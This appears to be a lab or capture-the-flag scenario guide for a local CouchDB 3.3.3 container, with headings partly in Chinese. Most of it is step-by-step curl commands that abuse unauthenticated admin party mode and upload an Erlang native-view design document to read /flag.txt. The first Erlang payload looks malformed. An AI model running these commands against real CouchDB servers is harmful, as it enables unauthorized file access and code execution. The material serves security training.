# DB-08: CouchDB Arbitrary Command Execution

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-08 |
| 名称 | CouchDB Arbitrary Command Execution |
| 技术/CVE | N/A (Erlang native view RCE) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10208 |

## 场景概述
- 技术：N/A (Erlang native view RCE)
- 难度：L2
- 交付方式：docker
- 入口端口：10208
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Admin Party Mode + Erlang Native View RCE) |
| Difficulty | L2 |
| Port | 10208 |
| Path | scenarios/db/couchdb-rce/ |
| Type | docker |
| Database | CouchDB 3.3.3 |

### Attack Path Summary
```
Discover CouchDB in admin party mode (no auth required) → Create database → Upload Erlang design document with file:read_file() → Query the view → Read /flag.txt
```

### Prerequisites

#### Knowledge
- CouchDB REST API: Understanding HTTP endpoints for database and document CRUD operations
- Admin Party mode: CouchDB's default configuration that allows full administrative access without authentication
- Erlang native views: CouchDB supports views written in Erlang (instead of JavaScript) that can access the Erlang standard library including file I/O functions
- Design documents: CouchDB design documents define views and other server-side logic

#### Tools
- curl: Sending HTTP requests to the CouchDB REST API

### Step-by-Step Exploitation

#### Step 1: Verify CouchDB is Running and Accessible

Check the CouchDB root endpoint to confirm the service is available.

```bash
curl http://localhost:10208/
```

#### Step 2: Confirm Admin Party Mode

Check the `_session` endpoint to verify that no authentication is required (admin party mode).

```bash
curl http://localhost:10208/_session
```

Expected response includes `"authenticated": "default"` or similar indicating no auth is needed.

#### Step 3: Get Server Information

Retrieve detailed server information.

```bash
curl http://localhost:10208/
```

#### Step 4: Create a Database

Create a new database to hold the exploit design document.

```bash
curl -X PUT http://localhost:10208/exploitdb
```

Expected response: `{"ok":true}`

#### Step 5: Create Erlang Design Document with RCE

Upload a design document containing an Erlang native view that reads `/flag.txt` using `file:read_file()`.

```bash
curl -X PUT http://localhost:10208/exploitdb/_design/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "_id": "_design/exploit",
    "language": "erlang",
    "views": {
      "readflag": {
        "map": "fun({Doc}) -> <<<<<<(fun()-> {ok, Bin} = file:read_file(\"/flag.txt\"), Bin end)()>>>>> end"
      }
    }
  }'
```

Note: The Erlang map function syntax may vary. The key is that CouchDB's Erlang view server evaluates the Erlang code with full filesystem access.

#### Step 6: Query the Malicious View

Trigger the Erlang view execution to read the flag file.

```bash
curl -X GET http://localhost:10208/exploitdb/_design/exploit/_view/readflag
```

The flag file content appears in the view result output.

#### Step 7: Alternative — Simpler Erlang View Payload

If the above Erlang syntax is not accepted, try an alternative form:

```bash
curl -X PUT http://localhost:10208/exploitdb/_design/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "_id": "_design/exploit",
    "language": "erlang",
    "views": {
      "readflag": {
        "map": "fun({Doc}) -> Emit = fun(Key, Value) -> ok end, {ok, Bin} = file:read_file(\"/flag.txt\"), Emit(0, binary_to_list(Bin)) end"
      }
    }
  }'
```

### Flag Location
- `/flag.txt` on the CouchDB container filesystem
- Read via Erlang `file:read_file()` through a native view

### Verification Commands
```bash
curl -s http://localhost:10208/exploitdb/_design/exploit/_view/readflag | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | CouchDB HTTP API and design documents |
| 侦察与前置条件 | Database/admin access and Erlang native view capability |
| 核心漏洞与利用 | Create or invoke an Erlang native view payload |
| 权限、横向或影响 | CouchDB host command execution |
| 验证 | Read the flag through the executed command |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
